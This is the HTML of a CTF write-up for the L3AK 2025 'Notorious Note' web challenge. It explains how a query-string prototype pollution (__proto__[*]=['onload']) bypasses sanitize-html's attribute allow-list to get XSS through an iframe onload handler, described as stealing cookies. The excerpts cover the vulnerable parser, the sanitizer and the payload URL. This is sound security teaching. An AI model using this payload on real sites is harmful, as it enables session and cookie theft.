<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>L3AK25: Writeup for Web/Notorious-Note | hxuu</title>
<meta name=keywords content="ctf,write-up,l3ak"><meta name=description content="CTF write-up for Notorious Note"><meta name=author content="hxuu"><link rel=canonical href=https://hxuu.github.io/blog/ctf/l3ak25/notorious-note/><link crossorigin=anonymous href=/blog/assets/css/stylesheet.a9de69711750554b5ca1926546c46a763ce30e0caa50cf5d86499b3b035e42bf.css integrity="sha256-qd5pcRdQVUtcoZJlRsRqdjzjDgyqUM9dhkmbOwNeQr8=" rel="preload stylesheet" as=style><link rel=icon href=https://hxuu.github.io/blog/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://hxuu.github.io/blog/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://hxuu.github.io/blog/favicon-32x32.png><link rel=apple-touch-icon href=https://hxuu.github.io/blog/apple-touch-icon.png><link rel=mask-icon href=https://hxuu.github.io/blog/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://hxuu.github.io/blog/ctf/l3ak25/notorious-note/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:url" content="https://hxuu.github.io/blog/ctf/l3ak25/notorious-note/"><meta property="og:site_name" content="hxuu"><meta property="og:title" content="L3AK25: Writeup for Web/Notorious-Note"><meta property="og:description" content="CTF write-up for Notorious Note"><meta property="og:locale" content="en-us"><meta property="og:type" content="article"><meta property="article:section" content="ctf"><meta property="article:published_time" content="2025-07-14T09:31:13+01:00"><meta property="article:modified_time" content="2025-07-14T09:31:13+01:00"><meta property="article:tag" content="Ctf"><meta property="article:tag" content="Write-Up"><meta property="article:tag" content="L3ak"><meta property="og:image" content="https://hxuu.github.io/blog/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://hxuu.github.io/blog/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta name=twitter:title content="L3AK25: Writeup for Web/Notorious-Note"><meta name=twitter:description content="CTF write-up for Notorious Note"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Ctfs","item":"https://hxuu.github.io/blog/ctf/"},{"@type":"ListItem","position":2,"name":"L3AK25: Writeup for Web/Notorious-Note","item":"https://hxuu.github.io/blog/ctf/l3ak25/notorious-note/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"L3AK25: Writeup for Web/Notorious-Note","name":"L3AK25: Writeup for Web\/Notorious-Note","description":"CTF write-up for Notorious Note","keywords":["ctf","write-up","l3ak"],"articleBody":"Challenge Overview CTF: L3AK CTF 2025 Challenge: Notorious Note Category: Web Exploitation Points: 50 (135 solves) Description: Casual coding vibes…until the notes start acting weird.\nAuthor: S1mple Challenge source (will update this when the ctf ends for reproducibility)\nTL;DR By polluting Object.prototype using a query parameter, we bypass a sanitize-html attribute whitelist and trigger an XSS with an payload. This is made possible due to insecure parsing logic and lack of prototype pollution defenses inside sanitize-html.\nInitial Analysis This looked like a straightforward reflected XSS challenge. User input comes from a note query parameter, which is passed to a sanitization function and then injected into the DOM via innerHTML:\nif (n) { const renderNote = txt =\u003e `${sanitizeHtml(txt)}`; el.innerHTML += renderNote(n); } Since innerHTML is used, any flaw in the sanitization process can result in a script injection. While mutation XSS is a potential concern here, our main interest lies in bypassing the sanitizer.\nThe codebase structure looked like this:\n. ├── Dockerfile ├── requirements.txt └── src ├── app.py ├── bot.py ├── static │ └── js │ ├── index.js │ ├── Query.js │ └── sanitize-html.min.js └── templates ├── notes.html └── visit.html 5 directories, 9 files I suspected the sanitizer was sanitize-html based on file names and grepping for known tags like allowedTags, allowedAttributes, etc.\nSince this was a famous library and no apparent vulnerabilities seemed to be there, I tried to look for other gadgets in the code base, and Query.js stood out to me:\nDiving into Query.js The file Query.js defines a custom query string parser. It transforms query parameters into nested JavaScript objects using dotted paths and bracket notation:\nQueryArg._qaAccess = function(obj, selector, value) { ... case '.': obj[currentRoot] = obj[currentRoot] || {}; return QueryArg._qaAccess(obj[currentRoot], nextSelector, value); This means that something like:\n/?user.name=hxuu\u0026user.age=23 Will produce:\n{ user: { name: \"hxuu\", age: 23 } } Harmless, right? But now think deeper. What if the provided key is dangerous… could we pollute the prototype?\nTask Analysis To understand where things could go wrong in the parsing logic, we first need to appreciate how JavaScript objects work under the hood.\nUnderstanding JavaScript Objects, ECMAScript Style Image taken from here Programmers manipulate data constantly, and in JavaScript, that data is represented by language values. These values belong to language types, things like Number, String, Boolean, and of course, Object.\nObjects are among those language types as well. They’re essentially a dynamic collection of properties most often defined like this:\nconst obj = { key: \"value\" } These properties come in two flavors:\nData properties: typical key-value pairs (obj.key = value) where the value is another language value. Accessor properties: You can think of them as key-value pairs where the value is a function that returns a language value. It should be noted that when an object is created, the properties you assign aren’t the only ones created, there are other properties like [[Get]] and [[Set]] which define retrieval and assignment respectively, there is also the [[Enumerable]] property which tells whether the object can be used in a for-in enumeration…etc.\nSmall detour: functions are objects too. What makes them callable is that they implement special properties like [[Call]] and [[Set]]. So yeah, your functions are just fancy objects with extra gear bolted on. Now Let’s Talk Behavior Every JavaScript object follows a set of behaviors, defined in the ECMAScript spec as internal methods. Internal methods are a set of algorithms that give objects their semantics.\nThese methods operate on internal data called slots, think of them as the object’s hidden storage for metadata and mechanics. They’re polymorphic: just because two objects have a [[Get]] doesn’t mean they behave the same. Each can have its own internal logic. And they’re mandatory: if you’re an object in JS-land, you must implement certain methods to be considered “valid.” One of the most important ones (and the one that will matter to us) is [[GetPrototypeOf]].\nPrototypes and Inheritance Let’s now look at how JavaScript handles inheritance, the magic behind why one object can access properties it never explicitly defined.\nEvery JavaScript object has an internal method called [[GetPrototypeOf]]. As the name implies, this returns the object’s prototype, that is, the object it inherits from.\nBut wait: What is this prototype object? And what exactly are inherited properties, mhmmm?\nAn inherited property is one that isn’t present directly on an object, but exists on its prototype (or somewhere up the prototype chain). That means the prototype is simply the object returned by GetPrototypeOf().\nEvery object has an internal slot called [[Prototype]]. It’s either null or another object. That “other object” becomes the fallback. If your current object is missing a property, JavaScript checks there.\nSo if a property P is missing from some object obj, but exists on obj.[[Prototype]], then accessing obj.P will still succeed, thanks to inheritance.\nWhether or not this inherited access works depends on a few internal details, like whether the object is extensible ([[Extensible]] = true), and whether the property you’re trying to inherit is writable or enumerable. The full logic lives in the spec.\nNow the real question is: How can we set the [[Prototype]] of our own obj to something malicious?\nThe answer lies in the __proto__ property. It’s not a normal key, it’s an accessor with both getter and setter behavior. So writing to obj.__proto__ doesn’t add a key, it actually rewires the object’s prototype.\nHere’s what that looks like:\nconst obj = {}; obj.__proto__ = { sneaky: 'value' }; Now, even though obj has no own property named sneaky, accessing obj.sneaky will return \"value\", because it was inherited from the newly assigned prototype.\nThe reason this works is that __proto__ has a [[Set]] internal method, meaning assignments to it are interpreted as prototype mutations, not property additions.\nAll we have to do now is identify which obj we can poison, and whether the application ever passes that poisoned structure into a vulnerable context.\nSpoiler: it does~\nExploitation Armed with this knowledge, the next step is to figure out where our parsed query object ends up, and whether it’s fed into a sensitive sink like sanitize-html.\nLet’s start by inspecting the default configuration of sanitize-html. A quick search in the codebase shows the following:\nsanitizeHtml.defaults = { allowedTags: [ \"h3\", \"h4\", \"h5\", \"h6\", \"blockquote\", \"p\", \"a\", \"ul\", \"ol\", \"nl\", \"li\", \"b\", \"i\", \"strong\", \"em\", \"strike\", \"abbr\", \"code\", \"hr\", \"br\", \"div\", \"table\", \"thead\", \"caption\", \"tbody\", \"tr\", \"th\", \"td\", \"pre\", \"iframe\" ], disallowedTagsMode: \"discard\", allowedAttributes: { a: [\"href\", \"name\", \"target\"], img: [\"src\"] }, selfClosing: [\"img\", \"br\", \"hr\", \"area\", \"base\", \"basefont\", \"input\", \"link\", \"meta\"], allowedSchemes: [\"http\", \"https\", \"ftp\", \"mailto\"], allowedSchemesByTag: {}, allowedSchemesAppliedToAttributes: [\"href\", \"src\", \"cite\"], allowProtocolRelative: true, enforceHtmlBoundary: false }; Few things stand out:\nis allowed (this is often a bad sign). Only specific attributes are permitted (href, src, etc.), and they’re tightly scoped. But here’s the thing, if we can sneak in an unexpected attribute like onload, especially on an iframe, it’s game over. Time to trace how allowedAttributes is processed internally.\nSpecial thanks to Securitum Research for uncovering such use for prototype pollution with HTML sanitizers\nFinding the Sink The first place we find it being used is during config setup:\nif (!options) { options = sanitizeHtml.defaults; options.parser = htmlParserDefaults; } Then, shortly after:\nif (options.allowedAttributes) { allowedAttributesMap = {}; allowedAttributesGlobMap = {}; each(options.allowedAttributes, function(attributes, tag) { allowedAttributesMap[tag] = []; var globRegex = []; attributes.forEach(function(obj) { if (isString(obj) \u0026\u0026 obj.indexOf(\"*\") \u003e= 0) { globRegex.push(quoteRegexp(obj).replace(/\\\\\\*/g, \".*\")); } else { allowedAttributesMap[tag].push(obj); } }); allowedAttributesGlobMap[tag] = new RegExp(\"^(\" + globRegex.join(\"|\") + \")$\"); }); } Here, the user-supplied allowedAttributes is broken down into two internal objects:\nallowedAttributesMap: direct attribute whitelists (e.g. { img: [\"src\"] }) allowedAttributesGlobMap: regex-based wildcards (e.g. { '*': /^(data-.*)$/ }) What matters is how these maps are checked later on:\nif ( !allowedAttributesMap || (has(allowedAttributesMap, name) \u0026\u0026 allowedAttributesMap[name].indexOf(a) !== -1) || (allowedAttributesMap[\"*\"] \u0026\u0026 allowedAttributesMap[\"*\"].indexOf(a) !== -1) || (has(allowedAttributesGlobMap, name) \u0026\u0026 allowedAttributesGlobMap[name].test(a)) || (allowedAttributesGlobMap[\"*\"] \u0026\u0026 allowedAttributesGlobMap[\"*\"].test(a)) ) { passedAllowedAttributesMapCheck = true; } Bingo~\nallowedAttributesMap[\"*\"] is read without any hasOwnProperty() checks. If we poison Object.prototype[\"*\"], the sanitizer will read it — and treat whatever array we give it as a legitimate attribute whitelist. That means: if we can make [\"onload\"] appear at allowedAttributesMap[\"*\"], then any tag, including , can now carry an onload. hasOwnProperty would’ve mitigated the risk by only checking the direct properties and not climbing the prototype chain\nThe Final Payload So, putting it all together:\nWe craft a query string that results in __proto__[\"*\"] = [\"onload\"]. We add a sanitized tag () with an onload that exfiltrates cookies. The recursive parser in Query.js writes into __proto__. sanitize-html sees allowedAttributesMap[\"*\"] = [\"onload\"] and happily allows it. Here’s the final payload:\nhttp://127.0.0.1:5000/?__proto__[*]=['onload']\u0026note=","wordCount":"1597","inLanguage":"en","image":"https://hxuu.github.io/blog/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E","datePublished":"2025-07-14T09:31:13+01:00","dateModified":"2025-07-14T09:31:13+01:00","author":{"@type":"Person","name":"hxuu"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://hxuu.github.io/blog/ctf/l3ak25/notorious-note/"},"publisher":{"@type":"Organization","name":"hxuu","logo":{"@type":"ImageObject","url":"https://hxuu.github.io/blog/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://hxuu.github.io/blog/ accesskey=h title="hxuu (Alt + H)"><img src=https://hxuu.github.io/apple-touch-icon.png alt aria-label=logo height=35>hxuu</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)" aria-label="Toggle theme"><svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://hxuu.github.io/blog/ctf/ title=CTFs><span>CTFs</span></a></li><li><a href=https://hxuu.github.io/blog/search/ title="Search (Alt + /)" accesskey=/><span>Search</span></a></li><li><a href=https://hxuu.github.io/blog/tags/ title=Tags><span>Tags</span></a></li><li><a href=https://github.com/hxuu title="About Me"><span>About Me</span>&nbsp;<svg fill="none" shape-rendering="geometricPrecision" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" viewBox="0 0 24 24" height="12" width="12"><path d="M18 13v6a2 2 0 01-2 2H5a2 2 0 01-2-2V8a2 2 0 012-2h6"/><path d="M15 3h6v6"/><path d="M10 14 21 3"/></svg></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://hxuu.github.io/blog/>Home</a>&nbsp;»&nbsp;<a href=https://hxuu.github.io/blog/ctf/>Ctfs</a></div><h1 class="post-title entry-hint-parent">L3AK25: Writeup for Web/Notorious-Note</h1><div class=post-description>CTF write-up for Notorious Note</div><div class=post-meta><span title='2025-07-14 09:31:13 +0100 +0100'>July 14, 2025</span>&nbsp;·&nbsp;8 min&nbsp;·&nbsp;hxuu&nbsp;|&nbsp;<a href=https://github.com/hxuu/content/ctf/l3ak25/notorious-note.md rel="noopener noreferrer edit" target=_blank>Suggest Changes</a></div></header><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#challenge-overview>Challenge Overview</a></li><li><a href=#tldr>TL;DR</a></li><li><a href=#initial-analysis>Initial Analysis</a><ul><li><a href=#diving-into-queryjs>Diving into Query.js</a></li></ul></li><li><a href=#task-analysis>Task Analysis</a><ul><li><a href=#understanding-javascript-objects-ecmascript-style>Understanding JavaScript Objects, ECMAScript Style</a></li><li><a href=#now-lets-talk-behavior>Now Let’s Talk Behavior</a></li><li><a href=#prototypes-and-inheritance>Prototypes and Inheritance</a></li></ul></li><li><a href=#exploitation>Exploitation</a><ul><li><a href=#finding-the-sink>Finding the Sink</a></li><li><a href=#the-final-payload>The Final Payload</a></li></ul></li><li><a href=#conclusions>Conclusions</a></li><li><a href=#references>References</a></li></ul></nav></div></details></div><div class=post-content><h2 id=challenge-overview>Challenge Overview<a hidden class=anchor aria-hidden=true href=#challenge-overview>#</a></h2><ul><li>CTF: L3AK CTF 2025</li><li>Challenge: Notorious Note</li><li>Category: Web Exploitation</li><li>Points: 50 (135 solves)</li><li>Description:</li></ul><blockquote><p>Casual coding vibes&mldr;until the notes start acting weird.</p></blockquote><p><img alt="challenge description" loading=lazy src=/blog/images/2025-07-15-11-53-30.png></p><ul><li>Author: <a href=https://discord.com/users/621008731773206538>S1mple</a></li></ul><p><a href="https://ctf.l3ak.team/files/d5d05524a7bccce4d6d0133d32f1a339/dist.zip?token=eyJ1c2VyX2lkIjoyMjE0LCJ0ZWFtX2lkIjoxMDU5LCJmaWxlX2lkIjo0OH0.aHY1-A._984WNDu9vdIYD8iVlsPAAOhMQw">Challenge source (will update this when the ctf ends for reproducibility)</a></p><h2 id=tldr>TL;DR<a hidden class=anchor aria-hidden=true href=#tldr>#</a></h2><p>By polluting <code>Object.prototype</code> using a query parameter, we bypass a <code>sanitize-html</code> attribute whitelist and trigger an XSS with an <code>&lt;iframe onload=...></code> payload. This is made possible due to insecure parsing logic and lack of prototype pollution defenses inside <code>sanitize-html</code>.</p><h2 id=initial-analysis>Initial Analysis<a hidden class=anchor aria-hidden=true href=#initial-analysis>#</a></h2><p><img alt="web application showcase" loading=lazy src=/blog/images/l3ak25/l3ak-notorious-note.gif></p><p>This looked like a straightforward reflected XSS challenge. User input comes from a <code>note</code> query parameter, which is passed to a sanitization function and then injected into the DOM via <code>innerHTML</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=nx>n</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kr>const</span> <span class=nx>renderNote</span> <span class=o>=</span> <span class=nx>txt</span> <span class=p>=&gt;</span> <span class=sb>`&lt;div class=&#34;note-item&#34;&gt;</span><span class=si>${</span><span class=nx>sanitizeHtml</span><span class=p>(</span><span class=nx>txt</span><span class=p>)</span><span class=si>}</span><span class=sb>&lt;/div&gt;`</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nx>el</span><span class=p>.</span><span class=nx>innerHTML</span> <span class=o>+=</span> <span class=nx>renderNote</span><span class=p>(</span><span class=nx>n</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>Since <code>innerHTML</code> is used, any flaw in the sanitization process can result in a script injection. While mutation XSS is a potential concern here, our main interest lies in <strong>bypassing</strong> the sanitizer.</p><p>The codebase structure looked like this:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>.
</span></span><span class=line><span class=cl>├── Dockerfile
</span></span><span class=line><span class=cl>├── requirements.txt
</span></span><span class=line><span class=cl>└── src
</span></span><span class=line><span class=cl>    ├── app.py
</span></span><span class=line><span class=cl>    ├── bot.py
</span></span><span class=line><span class=cl>    ├── static
</span></span><span class=line><span class=cl>    │   └── js
</span></span><span class=line><span class=cl>    │       ├── index.js
</span></span><span class=line><span class=cl>    │       ├── Query.js
</span></span><span class=line><span class=cl>    │       └── sanitize-html.min.js
</span></span><span class=line><span class=cl>    └── templates
</span></span><span class=line><span class=cl>        ├── notes.html
</span></span><span class=line><span class=cl>        └── visit.html
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=m>5</span> directories, <span class=m>9</span> files
</span></span></code></pre></div><p>I suspected the sanitizer was <a href=https://github.com/apostrophecms/sanitize-html>sanitize-html</a> based on file names and grepping for known tags like <code>allowedTags</code>, <code>allowedAttributes</code>, etc.</p><p>Since this was a famous library and no apparent vulnerabilities seemed to be there,
I tried to look for other gadgets in the code base, and <code>Query.js</code> stood out to me:</p><h3 id=diving-into-queryjs>Diving into Query.js<a hidden class=anchor aria-hidden=true href=#diving-into-queryjs>#</a></h3><p>The file <code>Query.js</code> defines a custom query string parser. It transforms query parameters into nested JavaScript objects using dotted paths and bracket notation:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=nx>QueryArg</span><span class=p>.</span><span class=nx>_qaAccess</span> <span class=o>=</span> <span class=kd>function</span><span class=p>(</span><span class=nx>obj</span><span class=p>,</span> <span class=nx>selector</span><span class=p>,</span> <span class=nx>value</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=p>...</span>
</span></span><span class=line><span class=cl>  <span class=k>case</span> <span class=s1>&#39;.&#39;</span><span class=o>:</span>
</span></span><span class=line><span class=cl>    <span class=nx>obj</span><span class=p>[</span><span class=nx>currentRoot</span><span class=p>]</span> <span class=o>=</span> <span class=nx>obj</span><span class=p>[</span><span class=nx>currentRoot</span><span class=p>]</span> <span class=o>||</span> <span class=p>{};</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nx>QueryArg</span><span class=p>.</span><span class=nx>_qaAccess</span><span class=p>(</span><span class=nx>obj</span><span class=p>[</span><span class=nx>currentRoot</span><span class=p>],</span> <span class=nx>nextSelector</span><span class=p>,</span> <span class=nx>value</span><span class=p>);</span>
</span></span></code></pre></div><p>This means that something like:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>/?user.name<span class=o>=</span>hxuu<span class=p>&amp;</span>user.age<span class=o>=</span><span class=m>23</span>
</span></span></code></pre></div><p>Will produce:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=nx>user</span><span class=o>:</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>name</span><span class=o>:</span> <span class=s2>&#34;hxuu&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nx>age</span><span class=o>:</span> <span class=mi>23</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>Harmless, right? But now think deeper. What if the provided key is dangerous&mldr; could we pollute the prototype?</p><h2 id=task-analysis>Task Analysis<a hidden class=anchor aria-hidden=true href=#task-analysis>#</a></h2><p>To understand where things could go wrong in the parsing logic, we first need to appreciate how JavaScript objects work under the hood.</p><h3 id=understanding-javascript-objects-ecmascript-style>Understanding JavaScript Objects, ECMAScript Style<a hidden class=anchor aria-hidden=true href=#understanding-javascript-objects-ecmascript-style>#</a></h3><table><thead><tr><th></th></tr></thead><tbody><tr><td><img alt="Object Prototype Chain Illustration" loading=lazy src="https://external-content.duckduckgo.com/iu/?u=https%3A%2F%2Fasset.jarombek.com%2Fposts%2F6-9-18-prototype-traverse.png&f=1&nofb=1&ipt=a552ce542ac950a53a6bf7fc01d189ee437ef7fdeffc645c247b80949df53e58"></td></tr><tr><td>Image taken from <a href=https://www.vrogue.co/>here</a></td></tr></tbody></table><p>Programmers manipulate data constantly, and in JavaScript, that data is represented by <strong>language values</strong>. These values belong to <strong>language types</strong>, things like <code>Number</code>, <code>String</code>, <code>Boolean</code>, and of course, <code>Object</code>.</p><p>Objects are among those language types as well. They&rsquo;re essentially a dynamic collection of <em>properties</em>
most often defined like this:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=kr>const</span> <span class=nx>obj</span> <span class=o>=</span> <span class=p>{</span> <span class=nx>key</span><span class=o>:</span> <span class=s2>&#34;value&#34;</span> <span class=p>}</span>
</span></span></code></pre></div><p>These properties come in two flavors:</p><ul><li><strong>Data properties:</strong> typical key-value pairs (<code>obj.key = value</code>) where the value is another language value.</li><li><strong>Accessor properties:</strong> You can think of them as key-value pairs where the value is a function that returns a language value.</li></ul><p><em>It should be noted</em> that when an object is created, the properties you assign aren&rsquo;t the only ones created, there are other properties like <code>[[Get]]</code> and <code>[[Set]]</code> which define retrieval and assignment respectively, there is also the <code>[[Enumerable]]</code> property which tells whether the object can be used in a <strong>for-in</strong> enumeration&mldr;etc.</p><div style="padding:1rem;margin:1rem 0;border-left:4px solid;border-radius:.5rem;background-color:#1e293b;border-color:#38bdf8;color:#e5e7eb;font-size:.95rem;line-height:1.5;font-family:system-ui,sans-serif">Small detour: functions are objects too. What makes them callable is that they implement special properties like [[Call]] and [[Set]]. So yeah, your functions are just fancy objects with extra gear bolted on.</div><h3 id=now-lets-talk-behavior>Now Let’s Talk Behavior<a hidden class=anchor aria-hidden=true href=#now-lets-talk-behavior>#</a></h3><p>Every JavaScript object follows a set of behaviors, defined in the <a href=https://tc39.es/ecma262/multipage/>ECMAScript spec</a> as internal methods.
Internal methods are a set of algorithms that give objects their semantics.</p><ul><li>These methods operate on internal data called <strong>slots</strong>, think of them as the object&rsquo;s hidden storage for metadata and mechanics.</li><li>They&rsquo;re <strong>polymorphic</strong>: just because two objects have a <code>[[Get]]</code> doesn&rsquo;t mean they behave the same. Each can have its own internal logic.</li><li>And they’re <strong>mandatory</strong>: if you’re an object in JS-land, you must implement certain methods to be considered “valid.”</li></ul><p>One of the most important ones (and the one that will matter to us) is <strong><code>[[GetPrototypeOf]]</code></strong>.</p><h3 id=prototypes-and-inheritance>Prototypes and Inheritance<a hidden class=anchor aria-hidden=true href=#prototypes-and-inheritance>#</a></h3><p>Let’s now look at how JavaScript handles inheritance, the <em>magic</em> behind why one object can access properties it never explicitly defined.</p><p>Every JavaScript object has an internal method called <code>[[GetPrototypeOf]]</code>. As the name implies, this returns the object’s <strong>prototype</strong>, that is, the object it inherits from.</p><p>But wait:
<strong>What is this prototype object? And what exactly are inherited properties, mhmmm?</strong></p><hr><p>An <strong>inherited property</strong> is one that isn&rsquo;t present directly on an object, but exists on its prototype (or somewhere up the prototype chain). That means the prototype is simply the object returned by <code>GetPrototypeOf()</code>.</p><blockquote><p>Every object has an internal slot called <code>[[Prototype]]</code>. It’s either <code>null</code> or another object. That &ldquo;other object&rdquo; becomes the fallback. If your current object is missing a property, JavaScript checks there.</p></blockquote><p>So if a property <code>P</code> is missing from some object <code>obj</code>, but exists on <code>obj.[[Prototype]]</code>, then accessing <code>obj.P</code> will still succeed, thanks to inheritance.</p><blockquote><p>Whether or not this inherited access works depends on a few internal details, like whether the object is extensible (<code>[[Extensible]] = true</code>), and whether the property you’re trying to inherit is <strong>writable</strong> or <strong>enumerable</strong>. The full logic lives in the spec.</p></blockquote><hr><p>Now the real question is:
<strong>How can we <em>set</em> the <code>[[Prototype]]</code> of our own <code>obj</code> to something malicious?</strong></p><p>The answer lies in the <code>__proto__</code> property. It’s not a normal key, it’s an <strong>accessor</strong> with both getter and setter behavior. So writing to <code>obj.__proto__</code> doesn’t add a key, it actually rewires the object’s prototype.</p><p>Here’s what that looks like:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=kr>const</span> <span class=nx>obj</span> <span class=o>=</span> <span class=p>{};</span>
</span></span><span class=line><span class=cl><span class=nx>obj</span><span class=p>.</span><span class=nx>__proto__</span> <span class=o>=</span> <span class=p>{</span> <span class=nx>sneaky</span><span class=o>:</span> <span class=s1>&#39;value&#39;</span> <span class=p>};</span>
</span></span></code></pre></div><p>Now, even though <code>obj</code> has no own property named <code>sneaky</code>, accessing <code>obj.sneaky</code> will return <code>"value"</code>, because it was inherited from the newly assigned prototype.</p><p><img alt="prototype chain behavior" loading=lazy src=/blog/images/2025-07-15-12-27-55.png></p><blockquote><p>The reason this works is that <code>__proto__</code> has a <code>[[Set]]</code> internal method, meaning assignments to it are interpreted as prototype mutations, not property additions.</p></blockquote><p>All we have to do now is identify which obj we can poison, and whether the application ever passes that poisoned structure into a vulnerable context.</p><p><em>Spoiler: it does~</em></p><h2 id=exploitation>Exploitation<a hidden class=anchor aria-hidden=true href=#exploitation>#</a></h2><p>Armed with this knowledge, the next step is to figure out where our parsed query object ends up, and whether it’s fed into a sensitive sink like <code>sanitize-html</code>.</p><p>Let’s start by inspecting the default configuration of <code>sanitize-html</code>. A quick search in the codebase shows the following:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=nx>sanitizeHtml</span><span class=p>.</span><span class=nx>defaults</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>allowedTags</span><span class=o>:</span> <span class=p>[</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;h3&#34;</span><span class=p>,</span> <span class=s2>&#34;h4&#34;</span><span class=p>,</span> <span class=s2>&#34;h5&#34;</span><span class=p>,</span> <span class=s2>&#34;h6&#34;</span><span class=p>,</span> <span class=s2>&#34;blockquote&#34;</span><span class=p>,</span> <span class=s2>&#34;p&#34;</span><span class=p>,</span> <span class=s2>&#34;a&#34;</span><span class=p>,</span> <span class=s2>&#34;ul&#34;</span><span class=p>,</span> <span class=s2>&#34;ol&#34;</span><span class=p>,</span> <span class=s2>&#34;nl&#34;</span><span class=p>,</span> <span class=s2>&#34;li&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;b&#34;</span><span class=p>,</span> <span class=s2>&#34;i&#34;</span><span class=p>,</span> <span class=s2>&#34;strong&#34;</span><span class=p>,</span> <span class=s2>&#34;em&#34;</span><span class=p>,</span> <span class=s2>&#34;strike&#34;</span><span class=p>,</span> <span class=s2>&#34;abbr&#34;</span><span class=p>,</span> <span class=s2>&#34;code&#34;</span><span class=p>,</span> <span class=s2>&#34;hr&#34;</span><span class=p>,</span> <span class=s2>&#34;br&#34;</span><span class=p>,</span> <span class=s2>&#34;div&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;table&#34;</span><span class=p>,</span> <span class=s2>&#34;thead&#34;</span><span class=p>,</span> <span class=s2>&#34;caption&#34;</span><span class=p>,</span> <span class=s2>&#34;tbody&#34;</span><span class=p>,</span> <span class=s2>&#34;tr&#34;</span><span class=p>,</span> <span class=s2>&#34;th&#34;</span><span class=p>,</span> <span class=s2>&#34;td&#34;</span><span class=p>,</span> <span class=s2>&#34;pre&#34;</span><span class=p>,</span> <span class=s2>&#34;iframe&#34;</span>
</span></span><span class=line><span class=cl>    <span class=p>],</span>
</span></span><span class=line><span class=cl>    <span class=nx>disallowedTagsMode</span><span class=o>:</span> <span class=s2>&#34;discard&#34;</span><span class=p>,</span>
